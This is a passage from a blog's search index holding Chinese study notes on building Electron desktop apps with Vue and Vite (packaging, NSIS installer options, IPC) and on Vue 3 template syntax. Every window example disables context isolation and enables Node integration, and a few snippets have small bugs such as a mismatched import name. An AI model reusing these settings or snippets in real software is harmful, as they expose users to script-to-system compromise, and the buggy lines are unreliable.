      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue+Electron桌面程序</title>
    <url>/web/study/Vue/39.Vue+Electron%E6%A1%8C%E9%9D%A2%E7%A8%8B%E5%BA%8F.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Electron"><a href="#Electron" class="headerlink" title="Electron"></a>Electron</h1><p><a href="https://www.electronjs.org/zh/">Electron官网</a></p>
<p>Electron内置了Chromium（谷歌浏览器）和Node.js</p>
<p>其中Chromium是渲染进程，主要渲染和解析HTML；Node.js作为主进程，管道用IPC通信</p>
<h1 id="Vite构建Electron项目"><a href="#Vite构建Electron项目" class="headerlink" title="Vite构建Electron项目"></a>Vite构建Electron项目</h1><p>需要安装两个依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install electron -D</span><br><span class="line">npm install vite-plugin-electron -D</span><br></pre></td></tr></table></figure>

<p>配置vite.config.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> electron <span class="keyword">from</span> <span class="string">&quot;vite-plugin-electron&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [<span class="title function_">electron</span>(&#123;</span><br><span class="line">    <span class="attr">entry</span>: <span class="string">&quot;electron/index.js&quot;</span></span><br><span class="line">  &#125;)],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>配置package.json：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="comment">// 删掉&quot;type&quot;: &quot;module&quot;,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dist-electron/index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>编写electron&#x2F;index.js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// app：应用程序   BrowserWindow：控制打开electron窗口</span></span><br><span class="line"><span class="keyword">import</span> &#123;app,<span class="title class_">BrowserWindow</span>&#125; <span class="keyword">from</span> <span class="string">&quot;electron&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建窗口</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">createWindow</span> = (<span class="params"></span>)=&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> win = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,  <span class="comment">// 是否和node集成</span></span><br><span class="line">      <span class="attr">contextIsolation</span>: <span class="literal">false</span>,  <span class="comment">// 是否上下文隔离</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(process.<span class="property">env</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 加载服务（使用vite服务地址的环境变量）</span></span><br><span class="line">  win.<span class="title function_">loadURL</span>(<span class="string">`<span class="subst">$&#123;process.env[<span class="string">&#x27;VITE_DEV_SERVER_URL&#x27;</span>]&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化，创建窗口</span></span><br><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(createWindow)</span><br></pre></td></tr></table></figure>

<p>执行<code>npm run dev</code>，程序启动了。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://image.cheriko.fun/post/202306041557680.png"></p>
<h1 id="Electron项目打包"><a href="#Electron项目打包" class="headerlink" title="Electron项目打包"></a>Electron项目打包</h1><p>安装依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install electron-builder -D</span><br><span class="line">// 能够使用环境变量</span><br><span class="line">npm install cross-env</span><br></pre></td></tr></table></figure>

<p>修改electron&#x2F;index.js：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// app：应用程序   BrowserWindow：控制打开electron窗口</span></span><br><span class="line"><span class="keyword">import</span> &#123;app,<span class="title class_">BrowserWindow</span>&#125; <span class="keyword">from</span> <span class="string">&quot;electron&quot;</span></span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建窗口</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">createWindow</span> = (<span class="params"></span>)=&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> win = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,  <span class="comment">// 是否和node集成</span></span><br><span class="line">      <span class="attr">contextIsolation</span>: <span class="literal">false</span>,  <span class="comment">// 是否上下文隔离</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// electron app.isPackaged api有bug，无法准确识别是否处于生产环境</span></span><br><span class="line">  <span class="comment">// 使用自定义的环境变量区分开发环境和生产环境</span></span><br><span class="line">  <span class="comment">// if(app.isPackaged) &#123;</span></span><br><span class="line">  <span class="keyword">if</span>(process.<span class="property">env</span>.<span class="property">NODE_ENV</span> != <span class="string">&quot;development&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果是打包文件，加载index.html</span></span><br><span class="line">    win.<span class="title function_">loadFile</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../index.html&quot;</span>))</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果是开发环境，加载服务（使用vite服务地址的环境变量）</span></span><br><span class="line">    win.<span class="title function_">loadURL</span>(<span class="string">`<span class="subst">$&#123;process.env[<span class="string">&#x27;VITE_DEV_SERVER_URL&#x27;</span>]&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化，创建窗口</span></span><br><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(createWindow)</span><br></pre></td></tr></table></figure>

<p>package.json中添加打包配置：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// electron app.isPackaged api有bug，无法准确识别是否处于生产环境</span></span><br><span class="line">    <span class="comment">// 所以可以自定义一个环境变量来区分开发环境和生产环境</span></span><br><span class="line">    <span class="comment">// chcp 65001：开发环境调试时防止中文乱码</span></span><br><span class="line">    <span class="comment">// cross-env NODE_ENV=development：环境变量赋值为development</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chcp 65001 &amp;&amp; cross-env NODE_ENV=development vite&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vue-tsc &amp;&amp; vite build &amp;&amp; electron-builder&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;preview&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vite preview&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="comment">// 其他省略......</span></span><br><span class="line">  <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;appId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.electron.desktop&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;productName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;electron&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;asar&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;copyright&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Copyright © 2022 electron&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;directories&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;output&quot;</span><span class="punctuation">:</span> <span class="string">&quot;release/&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="string">&quot;dist&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="string">&quot;dist-electron&quot;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;mac&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;artifactName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;productName&#125;_$&#123;version&#125;.$&#123;ext&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;dmg&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;win&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">          <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;nsis&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="attr">&quot;arch&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="string">&quot;x64&quot;</span></span><br><span class="line">          <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;artifactName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;productName&#125;_$&#123;version&#125;.$&#123;ext&#125;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;nsis&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;oneClick&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;perMachine&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;allowToChangeInstallationDirectory&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;deleteAppDataOnUninstall&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;publish&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">      <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;provider&quot;</span><span class="punctuation">:</span> <span class="string">&quot;generic&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;releaseInfo&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;releaseNotes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;版本更新的具体内容&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>nsis的配置项：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;oneClick&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="comment">// 创建一键安装程序还是辅助安装程序（默认是一键安装）</span></span><br><span class="line">    <span class="attr">&quot;allowElevation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">// 是否允许请求提升，如果为false，则用户必须使用提升的权限重新启动安装程序 （仅作用于辅助安装程序）</span></span><br><span class="line">    <span class="attr">&quot;allowToChangeInstallationDirectory&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">// 是否允许修改安装目录 （仅作用于辅助安装程序）</span></span><br><span class="line">    <span class="attr">&quot;installerIcon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public/timg.ico&quot;</span><span class="punctuation">,</span><span class="comment">// 安装程序图标的路径</span></span><br><span class="line">    <span class="attr">&quot;uninstallerIcon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public/timg.ico&quot;</span><span class="punctuation">,</span><span class="comment">// 卸载程序图标的路径</span></span><br><span class="line">    <span class="attr">&quot;installerHeader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public/timg.ico&quot;</span><span class="punctuation">,</span> <span class="comment">// 安装时头部图片路径（仅作用于辅助安装程序）</span></span><br><span class="line">    <span class="attr">&quot;installerHeaderIcon&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public/timg.ico&quot;</span><span class="punctuation">,</span> <span class="comment">// 安装时标题图标（进度条上方）的路径（仅作用于一键安装程序）</span></span><br><span class="line">    <span class="attr">&quot;installerSidebar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public/installerSiddebar.bmp&quot;</span><span class="punctuation">,</span> <span class="comment">// 安装完毕界面图片的路径，图片后缀.bmp，尺寸164*314 （仅作用于辅助安装程序）</span></span><br><span class="line">    <span class="attr">&quot;uninstallerSidebar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;public/uninstallerSiddebar.bmp&quot;</span><span class="punctuation">,</span> <span class="comment">// 开始卸载界面图片的路径，图片后缀.bmp，尺寸164*314 （仅作用于辅助安装程序）</span></span><br><span class="line">    <span class="attr">&quot;uninstallDisplayName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;productName&#125;$&#123;version&#125;&quot;</span><span class="punctuation">,</span> <span class="comment">// 控制面板中的卸载程序显示名称</span></span><br><span class="line">    <span class="attr">&quot;createDesktopShortcut&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="comment">// 是否创建桌面快捷方式</span></span><br><span class="line">    <span class="attr">&quot;createStartMenuShortcut&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span><span class="comment">// 是否创建开始菜单快捷方式</span></span><br><span class="line">    <span class="attr">&quot;shortcutName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SHom&quot;</span><span class="punctuation">,</span> <span class="comment">// 用于快捷方式的名称，默认为应用程序名称</span></span><br><span class="line">    <span class="attr">&quot;include&quot;</span><span class="punctuation">:</span> <span class="string">&quot;script/installer.nsi&quot;</span><span class="punctuation">,</span>  <span class="comment">// NSIS包含定制安装程序脚本的路径，安装过程中自行调用  (可用于写入注册表 开机自启动等操作)</span></span><br><span class="line">    <span class="attr">&quot;script&quot;</span><span class="punctuation">:</span> <span class="string">&quot;script/installer.nsi&quot;</span><span class="punctuation">,</span>  <span class="comment">// 用于自定义安装程序的NSIS脚本的路径</span></span><br><span class="line">    <span class="attr">&quot;deleteAppDataOnUninstall&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="comment">// 是否在卸载时删除应用程序数据（仅作用于一键安装程序）</span></span><br><span class="line">    <span class="attr">&quot;runAfterFinish&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span>  <span class="comment">// 完成后是否运行已安装的应用程序（对于辅助安装程序，应删除相应的复选框）</span></span><br><span class="line">    <span class="attr">&quot;menuCategory&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span> <span class="comment">// 是否为开始菜单快捷方式和程序文件目录创建子菜单，如果为true，则使用公司名称</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>Electron debug工具<a href="https://github.com/pd4d10/debugtron">Debugtron</a></p>
<h1 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h1><p>进程间通信其实就是一种发布-订阅模式。</p>
<p>安装依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pnpm add vite-plugin-electron-renderer</span><br></pre></td></tr></table></figure>

<p>修改vite.config.ts：</p>
<figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; defineConfig &#125; <span class="keyword">from</span> <span class="string">&#x27;vite&#x27;</span></span><br><span class="line"><span class="keyword">import</span> vue <span class="keyword">from</span> <span class="string">&#x27;@vitejs/plugin-vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> electron <span class="keyword">from</span> <span class="string">&quot;vite-plugin-electron&quot;</span></span><br><span class="line"><span class="keyword">import</span> electronRender <span class="keyword">from</span> <span class="string">&quot;vite-plugin-electron-renderer&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// https://vitejs.dev/config/</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">plugins</span>: [<span class="title function_">vue</span>(),<span class="title function_">electron</span>(&#123;</span><br><span class="line">    <span class="attr">entry</span>: <span class="string">&quot;electron/index.js&quot;</span></span><br><span class="line">  &#125;),<span class="title function_">electronRenderer</span>()],</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>App.vue：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;send&quot;&gt;发送信息&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup lang=&quot;ts&quot;&gt;</span><br><span class="line">import &#123;ipcRenderer&#125; from &quot;electron&quot;</span><br><span class="line"></span><br><span class="line">const send = ()=&gt; &#123;</span><br><span class="line">  // 渲染进程给主进程发送消息</span><br><span class="line">  // 参数1：自定义事件名称   其他参数：携带的信息</span><br><span class="line">  ipcRenderer.send(&quot;message&quot;,114514)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 主进程使用ipcRenderer侦听来自渲染进程的事件</span><br><span class="line">ipcRenderer.on(&quot;load&quot;,(_,message)=&gt; &#123;</span><br><span class="line">  console.log(message, &quot;牛逼&quot;)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>electron&#x2F;index.js：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// app：应用程序   BrowserWindow：控制打开electron窗口</span></span><br><span class="line"><span class="keyword">import</span> &#123;app,<span class="title class_">BrowserWindow</span>,ipcMain&#125; <span class="keyword">from</span> <span class="string">&quot;electron&quot;</span></span><br><span class="line"><span class="keyword">import</span> path <span class="keyword">from</span> <span class="string">&quot;path&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建窗口</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">createWindow</span> = (<span class="params"></span>)=&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> win = <span class="keyword">new</span> <span class="title class_">BrowserWindow</span>(&#123;</span><br><span class="line">    <span class="attr">webPreferences</span>: &#123;</span><br><span class="line">      <span class="attr">nodeIntegration</span>: <span class="literal">true</span>,  <span class="comment">// 是否和node集成</span></span><br><span class="line">      <span class="attr">contextIsolation</span>: <span class="literal">false</span>,  <span class="comment">// 是否上下文隔离</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(process.<span class="property">env</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// if(app.isPackaged) &#123;</span></span><br><span class="line">  <span class="keyword">if</span>(process.<span class="property">env</span>.<span class="property">NODE_ENV</span> != <span class="string">&quot;development&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果是打包文件，加载index.html</span></span><br><span class="line">    win.<span class="title function_">loadFile</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../dist/index.html&quot;</span>))</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果是开发环境，加载服务（使用vite服务地址的环境变量）</span></span><br><span class="line">    win.<span class="title function_">loadURL</span>(<span class="string">`<span class="subst">$&#123;process.env[<span class="string">&#x27;VITE_DEV_SERVER_URL&#x27;</span>]&#125;</span>`</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 打开electron调试工具</span></span><br><span class="line">  win.<span class="property">webContents</span>.<span class="title function_">openDevTools</span>()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 主进程使用ipcMain侦听来自渲染进程的事件</span></span><br><span class="line">  <span class="comment">// 回调函数 参数1：event   其他参数：传的值</span></span><br><span class="line">  ipcMain.<span class="title function_">on</span>(<span class="string">&quot;message&quot;</span>,<span class="function">(<span class="params">_,msg</span>)=&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(msg,<span class="string">&quot;我趣&quot;</span>)</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 主进程给渲染进程发送消息</span></span><br><span class="line">    win.<span class="property">webContents</span>.<span class="title function_">send</span>(<span class="string">&quot;load&quot;</span>,&#123;<span class="attr">message</span>:<span class="number">1919810</span>&#125;)</span><br><span class="line">  &#125;, <span class="number">3000</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化，创建窗口</span></span><br><span class="line">app.<span class="title function_">whenReady</span>().<span class="title function_">then</span>(createWindow)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>前端</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>学习</tag>
        <tag>Vue.js</tag>
        <tag>Electron</tag>
      </tags>
  </entry>
  <entry>
    <title>模板语法&amp;Vue指令</title>
    <url>/web/study/Vue/4.%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95&amp;Vue%E6%8C%87%E4%BB%A4.html</url>
    <content><![CDATA[<p>本系列为视频课程的学习笔记。原课程：<a href="https://www.bilibili.com/video/BV1dS4y1y7vd?p=3&vd_source=abff2190dd215e2033f2ec57123dd1d6">Vue3 + vite + Ts + pinia + 实战 + 源码 +electron</a></p>
<h1 id="Vue3书写风格"><a href="#Vue3书写风格" class="headerlink" title="Vue3书写风格"></a>Vue3书写风格</h1><p>Vue3支持三种书写风格：</p>
<ul>
<li><p>选项式API（Options API），Vue2的写法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  // data() 返回的属性将会成为响应式的状态</span><br><span class="line">  // 并且暴露在 `this` 上</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      count: 0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  // methods 是一些用来更改状态与触发更新的函数</span><br><span class="line">  // 它们可以在模板中作为事件监听器绑定</span><br><span class="line">  methods: &#123;</span><br><span class="line">    increment() &#123;</span><br><span class="line">      this.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  // 生命周期钩子会在组件生命周期的各个不同阶段被调用</span><br><span class="line">  // 例如这个函数就会在组件挂载完成后被调用</span><br><span class="line">  mounted() &#123;</span><br><span class="line">    console.log(`The initial count is $&#123;this.count&#125;.`)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;increment&quot;&gt;Count is: &#123;&#123; count &#125;&#125;&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>组合式API（Composition API）</p>
<ul>
<li><p>setup函数形式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">import &#123; setup, ref, onMounted &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  setup() &#123;</span><br><span class="line">    // 响应式状态</span><br><span class="line">	const count = ref(0)</span><br><span class="line"></span><br><span class="line">	// 用来修改状态、触发更新的函数</span><br><span class="line">	function increment() &#123;</span><br><span class="line">  	  count.value++</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// 生命周期钩子</span><br><span class="line">	onMounted(() =&gt; &#123;</span><br><span class="line">      console.log(`The initial count is $&#123;count.value&#125;.`)</span><br><span class="line">	&#125;)</span><br><span class="line">	</span><br><span class="line">	// 必须将数据return出去，这样才能被展示</span><br><span class="line">	return &#123;</span><br><span class="line">	  count</span><br><span class="line">	&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;increment&quot;&gt;Count is: &#123;&#123; count &#125;&#125;&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>setup语法糖模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref, onMounted &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">// 响应式状态</span><br><span class="line">// 不需要return，直接可以被展示</span><br><span class="line">const count = ref(0)</span><br><span class="line"></span><br><span class="line">// 用来修改状态、触发更新的函数</span><br><span class="line">function increment() &#123;</span><br><span class="line">  count.value++</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 生命周期钩子</span><br><span class="line">onMounted(() =&gt; &#123;</span><br><span class="line">  console.log(`The initial count is $&#123;count.value&#125;.`)</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;increment&quot;&gt;Count is: &#123;&#123; count &#125;&#125;&lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h1 id="模板语法"><a href="#模板语法" class="headerlink" title="模板语法"></a>模板语法</h1><p>template中可以使用插值语法<code>&#123;&#123; xxx &#125;&#125;</code>，可以用变量、简单的运算、API调用等展示内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;!-- 编译成&lt;div&gt;1&lt;/div&gt; --&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; a &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;!-- 编译成&lt;div&gt;2&lt;/div&gt; --&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; a + 1 &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;!-- 编译成&lt;div&gt;true&lt;/div&gt; --&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; a? &quot;true&quot;: &quot;false&quot; &#125;&#125;&lt;/div&gt;</span><br><span class="line">  &lt;!-- 编译成&lt;div&gt;[&#123;&quot;num&quot;:1&#125;,&#123;&quot;num&quot;:2&#125;,&#123;&quot;num&quot;:3&#125;,&#123;&quot;num&quot;:4&#125;,&#123;&quot;num&quot;:5&#125;]&lt;/div&gt; --&gt;</span><br><span class="line">  &lt;div&gt;&#123;&#123; b.map(value=&gt;(&#123;num:v&#125;) &#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script setup&gt;</span><br><span class="line">const a = 1</span><br><span class="line">const b = [1,2,3,4,5]</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

